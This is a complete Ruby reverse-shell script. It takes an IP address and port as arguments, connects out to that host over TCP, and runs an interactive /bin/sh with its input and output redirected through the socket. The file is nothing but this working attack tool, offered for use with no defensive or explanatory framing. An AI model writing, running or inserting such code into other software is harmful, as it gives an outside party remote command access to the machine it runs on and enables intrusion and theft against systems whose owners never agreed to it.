#!/usr/bin/env ruby
#
# reverse shell
#
require 'socket'
if ARGV.size < 2
  puts "./rshell IP PORT"
  exit 0
end
ip, port = ARGV
s = TCPSocket.open(ip,port).to_i
exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)
